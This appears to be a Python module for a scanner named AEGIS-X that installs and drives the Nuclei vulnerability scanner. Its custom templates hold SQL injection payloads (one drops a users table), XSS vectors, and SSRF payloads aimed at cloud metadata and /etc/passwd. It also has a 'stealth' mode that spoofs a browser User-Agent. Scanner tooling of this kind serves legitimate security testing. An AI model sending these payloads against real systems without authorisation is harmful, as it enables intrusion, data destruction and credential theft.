#!/usr/bin/env python3
"""
Advanced Nuclei Integration for AEGIS-X
Integrates with Nuclei's 10,000+ vulnerability templates and advanced scanning capabilities
"""

import asyncio
import aiohttp
import json
import os
import subprocess
import tempfile
import logging
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
import yaml
import re

logger = logging.getLogger(__name__)

@dataclass
class NucleiResult:
    template_id: str
    template_name: str
    severity: str
    url: str
    matched_at: str
    extracted_results: List[str]
    curl_command: str
    description: str
    reference: List[str]
    classification: Dict[str, Any]
    raw_output: str

class AdvancedNucleiIntegration:
    """Advanced Nuclei integration with custom templates and enhanced scanning"""
    
    def __init__(self):
        self.nuclei_path = self._find_nuclei_binary()
        self.templates_path = os.path.join(os.path.dirname(__file__), '..', 'nuclei-templates')
        self.custom_templates_path = os.path.join(os.path.dirname(__file__), '..', 'custom-nuclei-templates')
        self.results = []
        
        # Advanced scanning configurations
        self.scan_configs = {
            'stealth': {
                'rate_limit': 10,
                'timeout': 5,
                'retries': 1,
                'delay': '1s',
                'headers': ['User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']
            },
            'aggressive': {
                'rate_limit': 100,
                'timeout': 10,
                'retries': 3,
                'delay': '0s',
                'headers': []
            },
            'comprehensive': {
                'rate_limit': 50,
                'timeout': 15,
                'retries': 2,
                'delay': '500ms',
                'headers': ['User-Agent: AEGIS-X Scanner v7.0']
            }
        }
        
        # Initialize templates
        asyncio.create_task(self._initialize_templates())
    
    def _find_nuclei_binary(self) -> Optional[str]:
        """Find Nuclei binary or install it"""
        # Check if nuclei is in PATH
        try:
            result = subprocess.run(['which', 'nuclei'], capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass
        
        # Try to install nuclei
        logger.info("Installing Nuclei scanner...")
        try:
            # Download and install nuclei
            install_cmd = [
                'bash', '-c',
                'curl -s https://api.github.com/repos/projectdiscovery/nuclei/releases/latest | '
                'grep "browser_download_url.*linux_amd64.zip" | '
                'cut -d : -f 2,3 | tr -d \\" | '
                'wget -qi - -O nuclei.zip && '
                'unzip -o nuclei.zip && '
                'chmod +x nuclei && '
                'mv nuclei /usr/local/bin/'
            ]
            subprocess.run(install_cmd, check=True, capture_output=True)
            return '/usr/local/bin/nuclei'
        except Exception as e:
            logger.warning(f"Could not install Nuclei: {e}")
            return None
    
    async def _initialize_templates(self):
        """Initialize and update Nuclei templates"""
        if not self.nuclei_path:
            logger.warning("Nuclei not available, creating custom templates")
            await self._create_custom_templates()
            return
        
        try:
            # Update nuclei templates
            logger.info("Updating Nuclei templates...")
            subprocess.run([self.nuclei_path, '-update-templates'], 
                         check=True, capture_output=True)
            
            # Create custom templates
            await self._create_custom_templates()
            
        except Exception as e:
            logger.error(f"Failed to initialize templates: {e}")
    
    async def _create_custom_templates(self):
        """Create custom vulnerability templates"""
        os.makedirs(self.custom_templates_path, exist_ok=True)
        
        # Advanced SQL Injection template
        sql_template = {
            'id': 'aegis-advanced-sqli',
            'info': {
                'name': 'Advanced SQL Injection Detection',
                'author': 'AEGIS-X',
                'severity': 'high',
                'description': 'Advanced SQL injection detection with multiple payloads',
                'classification': {
                    'cwe-id': 'CWE-89',
                    'owasp': 'A03:2021'
                }
            },
            'requests': [
                {
                    'method': 'GET',
                    'path': [
                        '{{BaseURL}}/search?q={{payload}}',
                        '{{BaseURL}}/user?id={{payload}}',
                        '{{BaseURL}}/product?id={{payload}}',
                        '{{BaseURL}}/sql/search?username={{payload}}'
                    ],
                    'payloads': {
                        'payload': [
                            "' OR '1'='1",
                            "' UNION SELECT 1,2,3--",
                            "'; DROP TABLE users--",
                            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                            "' OR 1=1#",
                            "admin'--",
                            "' OR 'x'='x",
                            "1' AND SLEEP(5)--",
                            "' UNION SELECT NULL,NULL,NULL--",
                            "' OR 1=1 LIMIT 1--"
                        ]
                    },
                    'matchers': [
                        {
                            'type': 'word',
                            'words': [
                                'mysql_fetch_array',
                                'ORA-01756',
                                'Microsoft OLE DB Provider',
                                'SQLServer JDBC Driver',
                                'PostgreSQL query failed',
                                'sqlite3.OperationalError',
                                'Database error',
                                'SQL syntax error'
                            ],
                            'condition': 'or'
                        },
                        {
                            'type': 'regex',
                            'regex': [
                                'SQL.*error',
                                'database.*error',
                                'mysql.*error',
                                'ORA-\\d+',
                                'ERROR.*SQL'
                            ],
                            'condition': 'or'
                        }
                    ]
                }
            ]
        }
        
        # Advanced XSS template
        xss_template = {
            'id': 'aegis-advanced-xss',
            'info': {
                'name': 'Advanced XSS Detection',
                'author': 'AEGIS-X',
                'severity': 'medium',
                'description': 'Advanced XSS detection with multiple vectors',
                'classification': {
                    'cwe-id': 'CWE-79',
                    'owasp': 'A03:2021'
                }
            },
            'requests': [
                {
                    'method': 'GET',
                    'path': [
                        '{{BaseURL}}/search?q={{payload}}',
                        '{{BaseURL}}/xss/reflect?message={{payload}}',
                        '{{BaseURL}}/comment?text={{payload}}'
                    ],
                    'payloads': {
                        'payload': [
                            '<script>alert("XSS")</script>',
                            '<img src=x onerror=alert("XSS")>',
                            '<svg onload=alert("XSS")>',
                            'javascript:alert("XSS")',
                            '<iframe src="javascript:alert(\'XSS\')">',
                            '<body onload=alert("XSS")>',
                            '<script>confirm("XSS")</script>',
                            '<marquee onstart=alert("XSS")>',
                            '<input onfocus=alert("XSS") autofocus>',
                            '<select onfocus=alert("XSS") autofocus>'
                        ]
                    },
                    'matchers': [
                        {
                            'type': 'word',
                            'words': [
                                '<script>alert("XSS")</script>',
                                'onerror=alert("XSS")',
                                'onload=alert("XSS")',
                                'javascript:alert'
                            ],
                            'condition': 'or'
                        }
                    ]
                }
            ]
        }
        
        # Advanced SSRF template
        ssrf_template = {
            'id': 'aegis-advanced-ssrf',
            'info': {
                'name': 'Advanced SSRF Detection',
                'author': 'AEGIS-X',
                'severity': 'high',
                'description': 'Advanced SSRF detection with multiple payloads',
                'classification': {
                    'cwe-id': 'CWE-918',
                    'owasp': 'A10:2021'
                }
            },
            'requests': [
                {
                    'method': 'POST',
                    'path': [
                        '{{BaseURL}}/ssrf/fetch',
                        '{{BaseURL}}/fetch',
                        '{{BaseURL}}/proxy',
                        '{{BaseURL}}/webhook'
                    ],
                    'body': 'url={{payload}}',
                    'headers': {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    'payloads': {
                        'payload': [
                            'http://127.0.0.1:22',
                            'http://localhost:3306',
                            'http://169.254.169.254/latest/meta-data/',
                            'file:///etc/passwd',
                            'http://0.0.0.0:80',
                            'http://[::1]:22',
                            'gopher://127.0.0.1:3306',
                            'dict://127.0.0.1:11211',
                            'http://metadata.google.internal/',
                            'http://169.254.169.254/computeMetadata/v1/'
                        ]
                    },
                    'matchers': [
                        {
                            'type': 'word',
                            'words': [
                                'SSH-2.0',
                                'root:x:0:0',
                                'ami-id',
                                'instance-id',
                                'MySQL',
                                'Connection refused',
                                'metadata'
                            ],
                            'condition': 'or'
                        }
                    ]
                }
            ]
        }
        
        # Save templates
        templates = [
            ('advanced-sqli.yaml', sql_template),
            ('advanced-xss.yaml', xss_template),
            ('advanced-ssrf.yaml', ssrf_template)
        ]
        
        for filename, template in templates:
            template_path = os.path.join(self.custom_templates_path, filename)
            with open(template_path, 'w') as f:
                yaml.dump(template, f, default_flow_style=False)
        
        logger.info(f"Created {len(templates)} custom templates")
    
    async def scan_target(self, target: str, scan_type: str = 'comprehensive') -> List[NucleiResult]:
        """Perform comprehensive Nuclei scan"""
        if not self.nuclei_path:
            logger.warning("Nuclei not available, using fallback scanning")
            return await self._fallback_scan(target)
        
        config = self.scan_configs.get(scan_type, self.scan_configs['comprehensive'])
        results = []
        
        try:
            # Build nuclei command
            cmd = [
                self.nuclei_path,
                '-target', target,
                '-json',
                '-silent',
                '-rate-limit', str(config['rate_limit']),
                '-timeout', str(config['timeout']),
                '-retries', str(config['retries']),
                '-delay', config['delay']
            ]
            
            # Add custom templates
            if os.path.exists(self.custom_templates_path):
                cmd.extend(['-t', self.custom_templates_path])
            
            # Add headers
            for header in config['headers']:
                cmd.extend(['-H', header])
            
            # Run nuclei scan
            logger.info(f"Running Nuclei scan on {target} with {scan_type} configuration")
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                # Parse results
                for line in stdout.decode().strip().split('\n'):
                    if line.strip():
                        try:
                            result_data = json.loads(line)
                            result = self._parse_nuclei_result(result_data)
                            if result:
                                results.append(result)
                        except json.JSONDecodeError:
                            continue
            else:
                logger.error(f"Nuclei scan failed: {stderr.decode()}")
        
        except Exception as e:
            logger.error(f"Error running Nuclei scan: {e}")
        
        self.results.extend(results)
        return results
    
    def _parse_nuclei_result(self, data: Dict[str, Any]) -> Optional[NucleiResult]:
        """Parse Nuclei JSON result"""
        try:
            return NucleiResult(
                template_id=data.get('template-id', ''),
                template_name=data.get('info', {}).get('name', ''),
                severity=data.get('info', {}).get('severity', 'unknown'),
                url=data.get('matched-at', ''),
                matched_at=data.get('matched-at', ''),
                extracted_results=data.get('extracted-results', []),
                curl_command=data.get('curl-command', ''),
                description=data.get('info', {}).get('description', ''),
                reference=data.get('info', {}).get('reference', []),
                classification=data.get('info', {}).get('classification', {}),
                raw_output=json.dumps(data, indent=2)
            )
        except Exception as e:
            logger.error(f"Error parsing Nuclei result: {e}")
            return None
    
    async def _fallback_scan(self, target: str) -> List[NucleiResult]:
        """Fallback scanning when Nuclei is not available"""
        logger.info(f"Performing fallback vulnerability scan on {target}")
        results = []
        
        # Basic vulnerability checks
        vulnerabilities = [
            {
                'path': '/sql/search?username=\' OR \'1\'=\'1',
                'template_id': 'fallback-sqli',
                'name': 'SQL Injection Test',
                'severity': 'high',
                'description': 'Basic SQL injection test'
            },
            {
                'path': '/xss/reflect?message=<script>alert("XSS")</script>',
                'template_id': 'fallback-xss',
                'name': 'XSS Test',
                'severity': 'medium',
                'description': 'Basic XSS test'
            },
            {
                'path': '/debug',
                'template_id': 'fallback-info-disclosure',
                'name': 'Information Disclosure',
                'severity': 'low',
                'description': 'Debug endpoint exposure'
            }
        ]
        
        async with aiohttp.ClientSession() as session:
            for vuln in vulnerabilities:
                try:
                    url = f"{target.rstrip('/')}{vuln['path']}"
                    async with session.get(url, timeout=10) as response:
                        content = await response.text()
                        
                        # Simple vulnerability detection
                        if vuln['template_id'] == 'fallback-sqli' and ('error' in content.lower() or 'sql' in content.lower()):
                            results.append(NucleiResult(
                                template_id=vuln['template_id'],
                                template_name=vuln['name'],
                                severity=vuln['severity'],
                                url=url,
                                matched_at=url,
                                extracted_results=[],
                                curl_command=f"curl -X GET '{url}'",
                                description=vuln['description'],
                                reference=[],
                                classification={'cwe-id': 'CWE-89'},
                                raw_output=content[:500]
                            ))
                        elif vuln['template_id'] == 'fallback-xss' and '<script>' in content:
                            results.append(NucleiResult(
                                template_id=vuln['template_id'],
                                template_name=vuln['name'],
                                severity=vuln['severity'],
                                url=url,
                                matched_at=url,
                                extracted_results=[],
                                curl_command=f"curl -X GET '{url}'",
                                description=vuln['description'],
                                reference=[],
                                classification={'cwe-id': 'CWE-79'},
                                raw_output=content[:500]
                            ))
                        elif vuln['template_id'] == 'fallback-info-disclosure' and response.status == 200:
                            results.append(NucleiResult(
                                template_id=vuln['template_id'],
                                template_name=vuln['name'],
                                severity=vuln['severity'],
                                url=url,
                                matched_at=url,
                                extracted_results=[],
                                curl_command=f"curl -X GET '{url}'",
                                description=vuln['description'],
                                reference=[],
                                classification={'cwe-id': 'CWE-200'},
                                raw_output=content[:500]
                            ))
                
                except Exception as e:
                    logger.debug(f"Error testing {vuln['path']}: {e}")
        
        return results
    
    async def scan_with_custom_payloads(self, target: str, payloads: List[str]) -> List[NucleiResult]:
        """Scan with custom payloads"""
        results = []
        
        # Create temporary template with custom payloads
        custom_template = {
            'id': 'aegis-custom-scan',
            'info': {
                'name': 'AEGIS-X Custom Payload Scan',
                'author': 'AEGIS-X',
                'severity': 'medium',
                'description': 'Custom payload vulnerability scan'
            },
            'requests': [
                {
                    'method': 'GET',
                    'path': ['{{BaseURL}}/{{payload}}'],
                    'payloads': {
                        'payload': payloads
                    },
                    'matchers': [
                        {
                            'type': 'status',
                            'status': [200, 500, 403, 404]
                        }
                    ]
                }
            ]
        }
        
        # Save temporary template
        temp_template_path = os.path.join(self.custom_templates_path, 'custom-payloads.yaml')
        with open(temp_template_path, 'w') as f:
            yaml.dump(custom_template, f, default_flow_style=False)
        
        # Run scan with custom template
        results = await self.scan_target(target, 'comprehensive')
        
        # Clean up
        try:
            os.remove(temp_template_path)
        except:
            pass
        
        return results
    
    def get_scan_summary(self) -> Dict[str, Any]:
        """Get comprehensive scan summary"""
        if not self.results:
            return {'total': 0, 'by_severity': {}, 'by_category': {}}
        
        summary = {
            'total': len(self.results),
            'by_severity': {},
            'by_category': {},
            'high_risk_findings': [],
            'unique_templates': set()
        }
        
        for result in self.results:
            # Count by severity
            severity = result.severity
            summary['by_severity'][severity] = summary['by_severity'].get(severity, 0) + 1
            
            # Count by category (CWE)
            cwe = result.classification.get('cwe-id', 'Unknown')
            summary['by_category'][cwe] = summary['by_category'].get(cwe, 0) + 1
            
            # Track unique templates
            summary['unique_templates'].add(result.template_id)
            
            # High-risk findings
            if severity in ['critical', 'high']:
                summary['high_risk_findings'].append({
                    'template': result.template_name,
                    'url': result.url,
                    'severity': result.severity
                })
        
        summary['unique_templates'] = len(summary['unique_templates'])
        return summary